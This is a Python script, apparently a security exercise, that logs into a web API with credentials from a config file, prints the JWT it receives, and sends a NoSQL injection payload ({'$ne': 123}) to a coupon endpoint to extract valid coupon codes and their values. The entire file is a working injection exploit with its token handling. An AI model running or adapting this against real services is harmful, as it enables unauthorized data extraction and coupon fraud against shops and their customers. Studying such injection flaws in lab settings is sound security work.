import requests
import json
from pathlib import Path

file_dir_path = Path(__file__).resolve().parent

# Load configurations from config.json
with open(file_dir_path / "config.json", "r") as config_file:
    config = json.load(config_file)


for login in config["logins"]:
    data = {
        "email":login["email"],
        "password":login["password"]
        }
    response = requests.post(config["login_url"], json=data)
    if response.status_code == 200:
        jwt_token = response.json().get("token")
        if jwt_token:
            print("JWT token obtained successfully.")
            print("JWT token:", jwt_token)
        else:
            print("JWT token not found in response.")
    else:
        print("Authentication failed. Status code:", response.status_code)
    headers = {
        "Authorization": f"Bearer {jwt_token}",
        "Content-Type": "application/json"
    }
    payload = {
    "coupon_code": {"$ne": 123}
    }
    response = requests.post(config["target_url"], json=payload, headers=headers)
    print(response.status_code)
    response_data = response.json()
    coupon_code = response_data.get("coupon_code")
    amount = response_data.get("amount")
    print(f"coupon_code is: {coupon_code}")
    print(f"coupon_code money amount is: {amount}")